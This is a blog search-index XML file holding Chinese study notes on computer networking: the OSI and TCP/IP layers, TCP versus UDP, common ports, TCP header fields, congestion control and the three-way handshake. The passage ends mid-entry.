<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>计算机网络-网络分层(一)</title>
    <link href="/2021/10/13/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/10/13/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络-网络分层-一"><a href="#计算机网络-网络分层-一" class="headerlink" title="计算机网络-网络分层(一)"></a>计算机网络-网络分层(一)</h1><h2 id="网络互连模型"><a href="#网络互连模型" class="headerlink" title="网络互连模型"></a>网络互连模型</h2><span id="more"></span><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gcode">OSI参考模型<span class="hljs-comment">(open system reference model)</span> <span class="hljs-number">7</span>层<br><span class="hljs-number">7.</span>应用层<br><span class="hljs-number">6.</span>表示层<br><span class="hljs-number">5.</span>会话层<br><span class="hljs-number">4.</span>运输层<br><span class="hljs-number">3.</span>网络层<br><span class="hljs-number">2.</span>数据链路层<br><span class="hljs-number">1.</span>物理层<br><br>TCP/IP协议  <span class="hljs-number">4</span>层<br><span class="hljs-number">4.</span>应用层<br><span class="hljs-number">3.</span>运输层<br><span class="hljs-number">2.</span>网际层<br><span class="hljs-number">1.</span>网络接口层<br> <br>学习研究  <span class="hljs-number">5</span>层        请求过程        <br><span class="hljs-number">5.</span>应用层            <span class="hljs-number">5</span><span class="hljs-number">5</span>          报文/应用数据<br><span class="hljs-number">4.</span>运输层           <span class="hljs-number">45</span><span class="hljs-number">45</span>段<span class="hljs-comment">(segments)</span><br><span class="hljs-number">3.</span>网络层          <span class="hljs-number">345</span>   <span class="hljs-number">345</span>包<span class="hljs-comment">(packets)</span><br><span class="hljs-number">2.</span>数据链路层<span class="hljs-number">23452</span> <span class="hljs-number">23452</span>数据帧<br><span class="hljs-number">1.</span>物理层 <span class="hljs-number">123452</span>    <span class="hljs-number">123456</span>  比特流<br></code></pre></td></tr></table></figure><h2 id="一-物理层"><a href="#一-物理层" class="headerlink" title="一.物理层"></a>一.物理层</h2><h6 id="定义了接口标准，线缆速率，传输速率，传输方式"><a href="#定义了接口标准，线缆速率，传输速率，传输方式" class="headerlink" title="定义了接口标准，线缆速率，传输速率，传输方式"></a>定义了接口标准，线缆速率，传输速率，传输方式</h6><h6 id="1-数字信号"><a href="#1-数字信号" class="headerlink" title="1.数字信号:"></a>1.数字信号:</h6><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 离散的信号，不适合长距离传输<br><span class="hljs-bullet">2.</span> 抗干扰能力强<br></code></pre></td></tr></table></figure><h5 id="2-模拟信号"><a href="#2-模拟信号" class="headerlink" title="2.模拟信号:"></a>2.模拟信号:</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 连续的信号，适合长距离传输<br><span class="hljs-bullet">2.</span> 抗干扰能力差<br></code></pre></td></tr></table></figure><h5 id="3-信道"><a href="#3-信道" class="headerlink" title="3.信道:"></a>3.信道:</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">信息传输的通道<br>可分为<br><span class="hljs-bullet">1.</span> 单工通信<br><span class="hljs-bullet">2.</span> 半双工通信<br><span class="hljs-bullet">3.</span> 全双工通信<br></code></pre></td></tr></table></figure><h5 id="4-局域网通信模型"><a href="#4-局域网通信模型" class="headerlink" title="4.局域网通信模型"></a>4.局域网通信模型</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">PC -&gt;  数字信号/网线  -&gt;  交换机  数字信号/网线  -&gt;   PC<br></code></pre></td></tr></table></figure><h5 id="5-广域网通信模型"><a href="#5-广域网通信模型" class="headerlink" title="5.广域网通信模型"></a>5.广域网通信模型</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">PC-&gt;数字信号-&gt;调制解调器(光猫)-传输&gt;调制解调器-&gt;数字信号/网线-&gt;PC<br>PC-&gt;数字信号-&gt;光电转换器-传输&gt;光电转换器-&gt;数字信号/网线-&gt;PC<br></code></pre></td></tr></table></figure><h2 id="二-数据链路层"><a href="#二-数据链路层" class="headerlink" title="二.数据链路层"></a>二.数据链路层</h2><h5 id="1-链路"><a href="#1-链路" class="headerlink" title="1.链路:"></a>1.链路:</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">从一个节点到相邻接点的一段物理路线，中间没有其他交换节点<br></code></pre></td></tr></table></figure><h5 id="2-数据链路层的三个基本问题"><a href="#2-数据链路层的三个基本问题" class="headerlink" title="2.数据链路层的三个基本问题"></a>2.数据链路层的三个基本问题</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>封装成帧<br><span class="hljs-bullet">- </span>透明传输<br><span class="hljs-bullet">- </span>差错检验<br></code></pre></td></tr></table></figure><h2 id="三-网络层"><a href="#三-网络层" class="headerlink" title="三.网络层:"></a>三.网络层:</h2><h5 id="1-各层协议及数据包名称"><a href="#1-各层协议及数据包名称" class="headerlink" title="1.各层协议及数据包名称"></a>1.各层协议及数据包名称</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">协议所在最大层数<br>应用层       FTP<span class="hljs-regexp">/HTTP/</span>SMTP<span class="hljs-regexp">/DNS/</span>DHCP     报文/用户数据<br>运输层          TCP/UDP                    段<br>网络层          IP<span class="hljs-regexp">/ARP/</span>ICMP                包<br>数据链路层       CSMA<span class="hljs-regexp">/CD/</span>PPP                帧<br>物理层                                     比特流<br></code></pre></td></tr></table></figure><h6 id="2-TTL-time-to-live-生存时间"><a href="#2-TTL-time-to-live-生存时间" class="headerlink" title="2.TTL(time to live)生存时间"></a>2.TTL(time to live)生存时间</h6><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">每个路由器转发一次后TTL-<span class="hljs-number">1</span><br><br>观察ping命令后的TTL，能够推测出对方的操作系统，中间经过了多少个路由器<br><br>通过更改TTL值可得到经过的每一个路由器<br>ping baidu<span class="hljs-selector-class">.com</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">1</span> <br>ping baidu<span class="hljs-selector-class">.com</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">2</span><br>ping baidu<span class="hljs-selector-class">.com</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">3</span><br><br>tracert baidu.com<br></code></pre></td></tr></table></figure><h2 id="四-传输层-transport"><a href="#四-传输层-transport" class="headerlink" title="四.传输层(transport)"></a>四.传输层(transport)</h2><h6 id="TCP-transmission-control-protocol-传输控制协议"><a href="#TCP-transmission-control-protocol-传输控制协议" class="headerlink" title="TCP(transmission control protocol),传输控制协议"></a>TCP(transmission control protocol),传输控制协议</h6><h6 id="UDP-User-datagram-protocol-，用户数据报协议"><a href="#UDP-User-datagram-protocol-，用户数据报协议" class="headerlink" title="UDP(User datagram protocol)，用户数据报协议"></a>UDP(User datagram protocol)，用户数据报协议</h6><h5 id="1-TCP-UDP区别"><a href="#1-TCP-UDP区别" class="headerlink" title="1.TCP/UDP区别"></a>1.TCP/UDP区别</h5><table><thead><tr><th></th><th align="center">TCP</th><th>UDP</th></tr></thead><tbody><tr><td>连接性</td><td align="center">面向连接</td><td>无连接</td></tr><tr><td>可靠性</td><td align="center">可靠传输，不丢包</td><td>不可靠传输，尽最大努力交付可能丢包</td></tr><tr><td>首部占用空间</td><td align="center">大</td><td>小</td></tr><tr><td>传输速率</td><td align="center">慢</td><td>快</td></tr><tr><td>资源消耗</td><td align="center">大</td><td>小</td></tr><tr><td>应用场景</td><td align="center">浏览器/文件传输/邮件</td><td>音视频通话/直播(实时的 )</td></tr><tr><td>应用层协议</td><td align="center">HTTP/HTTPS/FTP/SMTP/DNS</td><td>DNS</td></tr><tr><td></td><td align="center"></td><td></td></tr></tbody></table><h6 id="2-常见协议默认使用端口"><a href="#2-常见协议默认使用端口" class="headerlink" title="2.常见协议默认使用端口"></a>2.常见协议默认使用端口</h6><table><thead><tr><th>协议</th><th align="left">默认端口号</th></tr></thead><tbody><tr><td>HTTP</td><td align="left">TCP+80</td></tr><tr><td>HTTPS</td><td align="left">TCP+443</td></tr><tr><td>FTP</td><td align="left">TCP+21</td></tr><tr><td>MySQL</td><td align="left">TCP+3306</td></tr><tr><td>DNS</td><td align="left">TCP/UDP+53</td></tr><tr><td>SMTP</td><td align="left">TCP+25</td></tr><tr><td>POP3</td><td align="left">TCP+110</td></tr></tbody></table><h6 id="关于端口的常见命令行"><a href="#关于端口的常见命令行" class="headerlink" title="关于端口的常见命令行"></a>关于端口的常见命令行</h6><ol><li>netstat-an:查看被占用的端口</li><li>netstat-anb: 查看被占用的端口，占用端口的程序</li><li>telnet 主机 端口:查看是否可以访问某个主机的某个端口</li></ol><h6 id="3-UDP"><a href="#3-UDP" class="headerlink" title="3.UDP"></a>3.UDP</h6><ol><li><h6 id="UDP是无连接的，减少了建立和释放连接的开销"><a href="#UDP是无连接的，减少了建立和释放连接的开销" class="headerlink" title="UDP是无连接的，减少了建立和释放连接的开销"></a>UDP是无连接的，减少了建立和释放连接的开销</h6></li><li><h6 id="UDP尽对大努力交付，不保证可靠交付"><a href="#UDP尽对大努力交付，不保证可靠交付" class="headerlink" title="UDP尽对大努力交付，不保证可靠交付"></a>UDP尽对大努力交付，不保证可靠交付</h6></li><li><h6 id="首部只有8个字节-源端口号-目的端口号-UDP长度-UDP校验和"><a href="#首部只有8个字节-源端口号-目的端口号-UDP长度-UDP校验和" class="headerlink" title="首部只有8个字节(源端口号+目的端口号+UDP长度+UDP校验和)"></a>首部只有8个字节(源端口号+目的端口号+UDP长度+UDP校验和)</h6><p><img src="https://i.loli.net/2021/10/23/cMTYhxFVEeBpLuC.png" alt="查看源图像"></p><p><img src="https://i.loli.net/2021/10/23/wZm1c5PM87GEFUI.png" alt="image-20211019103410401"></p></li></ol><h6 id="4-TCP"><a href="#4-TCP" class="headerlink" title="4.TCP"></a>4.TCP</h6><h6 id="1-TCP首部"><a href="#1-TCP首部" class="headerlink" title="1)TCP首部"></a>1)TCP首部</h6><p><img src="https://i.loli.net/2021/10/23/stnLkhvoQuUCfzO.jpg"></p><p><img src="https://i.loli.net/2021/10/23/nsL5C7jx3ZBuGTM.png" alt="image-20211019104752118"></p><ol><li><h6 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h6></li></ol><p><img src="https://i.loli.net/2021/10/23/AhWUQlDipOZ4Ruy.png" alt="image-20211019110015591"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1.</span><span class="hljs-constructor">URG(<span class="hljs-params">urgent</span>)</span>：作用与发送端，当URG=<span class="hljs-number">1</span>时，说明此数据段需要立即发送，此时发送端不考虑发送顺序问题，立刻将此数据包发送出去<br><span class="hljs-number">2.</span><span class="hljs-constructor">ACK(ACKnowledgment)</span>：当ACK=<span class="hljs-number">1</span>时，确认号才有作用<br><span class="hljs-number">3.</span><span class="hljs-constructor">PSH(<span class="hljs-params">push</span>)</span>：与URG相对，此作用于接收端，令接收端首先接受此数据<br><span class="hljs-number">4.</span><span class="hljs-constructor">RST(<span class="hljs-params">reset</span>)</span>：当TCP连接出现严重错误时，RST=<span class="hljs-number">1</span>，说明需要释放连接<br><span class="hljs-number">5.</span><span class="hljs-constructor">SYN(<span class="hljs-params">synchronous</span>)</span>：只有建立请求和确认请求的两个数据包中，SYN=<span class="hljs-number">1</span>，即TCP三次握手的前两次握手<br><span class="hljs-number">6.</span><span class="hljs-constructor">FIN(<span class="hljs-params">finish</span>)</span>：结束TCP连接<br></code></pre></td></tr></table></figure><ol start="2"><li><h6 id="序号"><a href="#序号" class="headerlink" title="序号"></a>序号</h6><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">首先，在传输过程中每一个字节都有一个编号<br><br>在建立连接后，首部的序号代表传给对方的TCP数据部分第一个字节的标号<br><br>比如，TCP传输数据内容为(0<span class="hljs-string">-99</span>,100<span class="hljs-string">-199</span>)过大，需要分2次传输<br>则分段传输TCP数据包的序号为0 100;<br>这样可以保证数据有序<br></code></pre></td></tr></table></figure></li><li><h6 id="确认号"><a href="#确认号" class="headerlink" title="确认号"></a>确认号</h6><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">在建立连接后，确定号代表:期望对方下一次传过来的TCP数据部分的第一个字节的编号 </span><br></code></pre></td></tr></table></figure><h6 id="4-数据偏移"><a href="#4-数据偏移" class="headerlink" title="4.数据偏移"></a>4.数据偏移</h6><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">占四位，取值范围<span class="hljs-number">0</span>x0<span class="hljs-number">101~0x1111</span><br>乘以<span class="hljs-number">4</span>即是首部长度(<span class="hljs-number">20</span>~<span class="hljs-number">60</span>字节)<br></code></pre></td></tr></table></figure><h6 id="5-保留位"><a href="#5-保留位" class="headerlink" title="5.保留位"></a>5.保留位</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">占6位，目前全为0，以后用<br></code></pre></td></tr></table></figure></li></ol><h5 id="TCP要点"><a href="#TCP要点" class="headerlink" title="TCP要点"></a>TCP要点</h5><ol><li><h6 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h6><ol><li><h6 id="停止等待ARQ协议-automatic-repeat-request-自动重传请求-效率低"><a href="#停止等待ARQ协议-automatic-repeat-request-自动重传请求-效率低" class="headerlink" title="停止等待ARQ协议(automatic repeat request),自动重传请求(效率低)"></a>停止等待ARQ协议(automatic repeat request),自动重传请求(效率低)</h6><p><img src="https://i.loli.net/2021/10/23/4H5ckhFzOiJsjdo.jpg" alt="查看源图像"></p><h6 id="b-连续ARQ协议-滑动窗口协议"><a href="#b-连续ARQ协议-滑动窗口协议" class="headerlink" title="b.连续ARQ协议+滑动窗口协议"></a>b.连续ARQ协议+滑动窗口协议</h6><p><img src="https://i.loli.net/2021/10/23/t3dHYCw6cZb9oD7.png" alt="查看源图像"></p><h6 id="c-SACK-选择性确认"><a href="#c-SACK-选择性确认" class="headerlink" title="c.SACK(选择性确认)"></a>c.SACK(选择性确认)</h6><p>在TCP通信中，如果发送序列的中间某个数据包丢失(123456中的5丢失)，TCP会重传后面的56数据包(包含已经发送过的6数据包)</p><h6 id="为改善以上情况，发展了SCAK技术，告诉发送方那些数据丢失，只重传丢失数据即可"><a href="#为改善以上情况，发展了SCAK技术，告诉发送方那些数据丢失，只重传丢失数据即可" class="headerlink" title="为改善以上情况，发展了SCAK技术，告诉发送方那些数据丢失，只重传丢失数据即可"></a>为改善以上情况，发展了SCAK技术，告诉发送方那些数据丢失，只重传丢失数据即可</h6></li></ol></li><li><h6 id="流量控制-根据传输情况动态调节窗口大小-点对点，两人之间接力传送包裹"><a href="#流量控制-根据传输情况动态调节窗口大小-点对点，两人之间接力传送包裹" class="headerlink" title="流量控制(根据传输情况动态调节窗口大小)(点对点，两人之间接力传送包裹)"></a>流量控制(根据传输情况动态调节窗口大小)(点对点，两人之间接力传送包裹)</h6><h6 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h6><h6 id="1-发送方和接收方都有一个缓存区，如果接收方的缓存区快满了，发送方还在发送大量数据，导致接收方只能将数据丢弃等待重传，极大地浪费了网络资源，所以要进行流量控制"><a href="#1-发送方和接收方都有一个缓存区，如果接收方的缓存区快满了，发送方还在发送大量数据，导致接收方只能将数据丢弃等待重传，极大地浪费了网络资源，所以要进行流量控制" class="headerlink" title="1)发送方和接收方都有一个缓存区，如果接收方的缓存区快满了，发送方还在发送大量数据，导致接收方只能将数据丢弃等待重传，极大地浪费了网络资源，所以要进行流量控制"></a>1)发送方和接收方都有一个缓存区，如果接收方的缓存区快满了，发送方还在发送大量数据，导致接收方只能将数据丢弃等待重传，极大地浪费了网络资源，所以要进行流量控制</h6><h6 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制:"></a>流量控制:</h6><h6 id="1-让发送方发送速率不要过快，让接收方来得及处理"><a href="#1-让发送方发送速率不要过快，让接收方来得及处理" class="headerlink" title="1)让发送方发送速率不要过快，让接收方来得及处理"></a>1)让发送方发送速率不要过快，让接收方来得及处理</h6><h6 id="控制原理"><a href="#控制原理" class="headerlink" title="控制原理:"></a>控制原理:</h6><p>1)调节确定报文中窗口字段来控制窗口大小</p><p>2)发送方的发送窗口大小不能超过接收方的窗口大小</p><p>3)当发送方的接收窗口大小为0时，发送方会停止发送数据</p><p>​        a)这种情况可能导致接收方无法知道接下来的窗口大小，因此会有一个定时器隔一段时间去询问最新窗口        大小</p></li><li><h6 id="拥塞控制-相对于流量控制来说是全局性的，交通需要大家维护"><a href="#拥塞控制-相对于流量控制来说是全局性的，交通需要大家维护" class="headerlink" title="拥塞控制(相对于流量控制来说是全局性的，交通需要大家维护)"></a>拥塞控制(相对于流量控制来说是全局性的，交通需要大家维护)</h6><p>1)数据传输过程中链路吞吐量与与阻塞程度关系</p><p><img src="https://i.loli.net/2021/10/23/lxJ6T3mNezPCWin.png" alt="查看源图像"></p><p>2)若无拥塞控制:随着吞吐量增大，会导致过度拥塞最终恶性循环导致死锁</p><p>3)拥塞控制:防止过多数据注入到链路中，避免链路过载</p><p>​        (发送窗口的最大值=min{接受窗口最大值，拥塞窗口最大值}</p><h6 id="a-慢启动"><a href="#a-慢启动" class="headerlink" title="a)慢启动"></a>a)慢启动</h6><p>​            cwnd(拥塞控制窗口)起初较小，随着发送过程中逐渐呈指数级增长</p><p>​            刚开始发的比较少，后面越来越多</p><h6 id="b-拥塞避免"><a href="#b-拥塞避免" class="headerlink" title="b)拥塞避免"></a>b)拥塞避免</h6><p>​            随着cwnd达到慢启动的阈值后，以线性方式增加</p><p>​            防止网络过早出现拥塞(未雨绸缪)</p><p>​            当网络出现拥塞，慢启动阈值减半，重新执行慢启动算法</p><p><img src="https://i.loli.net/2021/10/23/xE5MS7uDNCchdt2.jpg" alt="tcp 拥塞控制 的图像结果"></p><h6 id="c-快速重传"><a href="#c-快速重传" class="headerlink" title="c)快速重传"></a>c)快速重传</h6><p>​            收到一个失序的分组后立即发出三次重复确认，使发送方知道有分组没有到达，而不是等到自己发送数            据时才确认</p><h6 id="d-快速恢复"><a href="#d-快速恢复" class="headerlink" title="d)快速恢复"></a>d)快速恢复</h6><p>​            当发送方收到三个重复确认是，cwnd阈值减半，但不重新开始执行慢开始算法</p><p>​            直接从阈值开始执行拥塞避免(cwnd线性增长)</p></li><li><h6 id="连接管理"><a href="#连接管理" class="headerlink" title="连接管理"></a>连接管理</h6><h6 id="1-建立连接-三次握手"><a href="#1-建立连接-三次握手" class="headerlink" title="1)建立连接-三次握手"></a>1)建立连接-三次握手</h6><p>​            前两次握手</p><p>​            1.会互相交换一些信息，比如MSS，是否支持SACK，windows scale等(保存在头部的选项部分)</p><p>​            2.SYN都设置为1</p><p>​            3.数据部分的长度为0</p><p>​            4.TCP头部的长度一般是32个字节，固定头部20字节，选项部分12字节</p><p><img src="https://i.loli.net/2021/10/23/zASOXl96TwN5FUp.png" alt="查看源图像"></p><h6 id="2-释放连接-四次挥手"><a href="#2-释放连接-四次挥手" class="headerlink" title="2)释放连接-四次挥手"></a>2)释放连接-四次挥手</h6><p>​            任何⼀⽅都可以在数据传送结束后发出连接释放的通知，待对⽅确认后进⼊半关闭状态。当另⼀⽅也没            有数据再发送的时候，则发出连接释放通知，对⽅确认后就完全关闭了TCP连接。</p><p><img src="https://i.loli.net/2021/10/23/FTl5ALIxZnDHk3U.png" alt="查看源图像"></p></li></ol><h2 id="四-问题产生"><a href="#四-问题产生" class="headerlink" title="四.问题产生"></a>四.问题产生</h2><h6 id="1-为什么在传输层切分数据包，而不是网络层"><a href="#1-为什么在传输层切分数据包，而不是网络层" class="headerlink" title="1.为什么在传输层切分数据包，而不是网络层"></a>1.为什么在传输层切分数据包，而不是网络层</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">网络层和数据链路层没有重传功能<br><br>如果不在传输层分段，一旦数据丢失，整个传输侧层的数据都得重传<br><br>如果在传输层分了段，一旦数据丢失，只需要重传丢失的段即可<br></code></pre></td></tr></table></figure><h5 id="2-为什么TCP建立连接时3次握手，两次握手不行吗"><a href="#2-为什么TCP建立连接时3次握手，两次握手不行吗" class="headerlink" title="2.为什么TCP建立连接时3次握手，两次握手不行吗"></a>2.为什么TCP建立连接时3次握手，两次握手不行吗</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean">TCP三次连接<br><br>连接过程:连接请求 -&gt; 连接请求确认 -&gt;  确认<br><br>TCP两次连接的缺点<br><br>防止服务器端一直等待，浪费资源<br><br>如何建立连接只需要<span class="hljs-number">2</span>次握手，可能出现的情况<br><br><span class="hljs-number">1</span>)假设客户端发送的第一个连接请求报文段，由于网络延迟，在连接释放后的某个时间才到达服务器，<br><br>本来这已经是一个失效的请求，误让服务器以为客户端发出一个新的连接请求，而客户端不予理睬服务器。造成服务器一直等待。浪费资源。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-基础知识</title>
    <link href="/2021/10/07/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2021/10/07/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络-基础知识"><a href="#计算机网络-基础知识" class="headerlink" title="计算机网络-基础知识"></a>计算机网络-基础知识</h1><span id="more"></span><h6 id="为了满足各种需求，有各种各样的网络协议-HTTPS-SMTP-MQTT-RTMP"><a href="#为了满足各种需求，有各种各样的网络协议-HTTPS-SMTP-MQTT-RTMP" class="headerlink" title="为了满足各种需求，有各种各样的网络协议:(HTTPS  SMTP  MQTT  RTMP)"></a>为了满足各种需求，有各种各样的网络协议:(HTTPS  SMTP  MQTT  RTMP)</h6><h6 id="客户端-服务器-中间传输利用网络协议"><a href="#客户端-服务器-中间传输利用网络协议" class="headerlink" title="客户端-服务器(中间传输利用网络协议)"></a>客户端-服务器(中间传输利用网络协议)</h6><h6 id="C-C-的跨平台原理-针对不同平台使用对应的编译器生成不同的可执行文件"><a href="#C-C-的跨平台原理-针对不同平台使用对应的编译器生成不同的可执行文件" class="headerlink" title="C\C++的跨平台原理(针对不同平台使用对应的编译器生成不同的可执行文件)"></a>C\C++的跨平台原理(针对不同平台使用对应的编译器生成不同的<strong>可执行文件</strong>)</h6><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">代码<span class="hljs-function"><span class="hljs-params">(.c/.cpp)</span> -&gt;</span> PE格式 -&gt; 运行在windows<br>  -&gt; Mach-O格式 -&gt; 运行在Mac<br>  -&gt; ELF格式 -&gt; 运行在Linux<br></code></pre></td></tr></table></figure><h6 id="JAVA的跨平台原理-不同平台下利用JVM加载-class文件翻译成机器码后传给OS执行-一次编译，多次运行"><a href="#JAVA的跨平台原理-不同平台下利用JVM加载-class文件翻译成机器码后传给OS执行-一次编译，多次运行" class="headerlink" title="JAVA的跨平台原理(不同平台下利用JVM加载.class文件翻译成机器码后传给OS执行)   一次编译，多次运行"></a>JAVA的跨平台原理(不同平台下利用JVM加载.class文件翻译成机器码后传给OS执行)   一次编译，多次运行</h6><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">代码<span class="hljs-function"><span class="hljs-params">(.java)</span> -&gt;</span> 编译 -&gt; .<span class="hljs-keyword">class</span><span class="hljs-function"><span class="hljs-params">(字节码文件)</span> -&gt;</span> 不同平台安装JVM(可以理解为一个软件)后运行 -&gt; JVM加载<br></code></pre></td></tr></table></figure><h6 id="端口-连接客户端和服务器的枢纽-通过运行一个软件-占用某个端口-来实行监听功能-理解为营业厅的办事窗口"><a href="#端口-连接客户端和服务器的枢纽-通过运行一个软件-占用某个端口-来实行监听功能-理解为营业厅的办事窗口" class="headerlink" title="端口:连接客户端和服务器的枢纽,通过运行一个软件(占用某个端口)来实行监听功能(理解为营业厅的办事窗口)"></a>端口:连接客户端和服务器的枢纽,通过运行一个<strong>软件</strong>(<strong>占用某个端口</strong>)来实行监听功能(理解为营业厅的办事窗口)</h6><h6 id="TomCat软件-服务器下的服务器软件-管理服务器Java代码和端口之间的传输-类似于phpstudy"><a href="#TomCat软件-服务器下的服务器软件-管理服务器Java代码和端口之间的传输-类似于phpstudy" class="headerlink" title="TomCat软件:服务器下的服务器软件,管理服务器Java代码和端口之间的传输(类似于phpstudy)"></a>TomCat软件:服务器下的服务器软件,管理服务器Java代码和端口之间的传输(类似于phpstudy)</h6><h6 id="http-IP地址-端口号-项目"><a href="#http-IP地址-端口号-项目" class="headerlink" title="http://IP地址:端口号/项目"></a><a href="http://IP地址:端口号/项目">http://IP地址:端口号/项目</a></h6><h6 id="协议-国际标准组织制定的规定各种规则的标准"><a href="#协议-国际标准组织制定的规定各种规则的标准" class="headerlink" title="协议:国际标准组织制定的规定各种规则的标准"></a>协议:国际标准组织制定的规定各种规则的标准</h6><h6 id="网络-Network-多个计算机连接起来"><a href="#网络-Network-多个计算机连接起来" class="headerlink" title="网络(Network):多个计算机连接起来"></a>网络(Network):多个计算机连接起来</h6><h6 id="互联网-internet-多个网段通过路由器连接"><a href="#互联网-internet-多个网段通过路由器连接" class="headerlink" title="互联网(internet):多个网段通过路由器连接"></a>互联网(internet):多个网段通过路由器连接</h6><h6 id="因特网-Internet-全世界最大的互联网"><a href="#因特网-Internet-全世界最大的互联网" class="headerlink" title="因特网(Internet):全世界最大的互联网"></a>因特网(Internet):全世界最大的互联网</h6><h6 id="ISP-Internet-Service-Provider-，Internet服务提供商，比如移动电信联通"><a href="#ISP-Internet-Service-Provider-，Internet服务提供商，比如移动电信联通" class="headerlink" title="ISP(Internet Service Provider)，Internet服务提供商，比如移动电信联通"></a>ISP(Internet Service Provider)，Internet服务提供商，比如移动电信联通</h6><h6 id="服务器机房"><a href="#服务器机房" class="headerlink" title="服务器机房:"></a>服务器机房:</h6><p><img src="https://i.loli.net/2021/10/23/Ezhqurye7ZUgWaj.png" alt="2"></p><h6 id="常见的几种接口"><a href="#常见的几种接口" class="headerlink" title="常见的几种接口"></a>常见的几种接口</h6><ol><li><h6 id="FastEthernet快速以太网口"><a href="#FastEthernet快速以太网口" class="headerlink" title="FastEthernet快速以太网口"></a>FastEthernet快速以太网口</h6></li><li><h6 id="Serial串口，路由器与路由器相连之间用串口"><a 